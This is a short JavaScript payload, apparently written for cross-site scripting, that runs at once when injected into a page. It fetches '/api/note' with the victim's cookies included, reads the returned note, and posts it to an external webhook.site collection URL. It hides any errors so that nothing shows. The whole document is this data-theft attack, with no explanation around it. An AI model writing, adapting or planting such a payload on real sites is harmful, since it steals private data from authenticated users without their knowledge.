(async () => {
  try {
    const r = await fetch('/api/note', { credentials: 'include' });
    const { note } = await r.json();
    await fetch('https://webhook.site/8687e340-2901-45ef-9a3a-c8e1ea8cfc32', { method: 'POST', mode: 'no-cors', body: note });
  } catch {}
})();
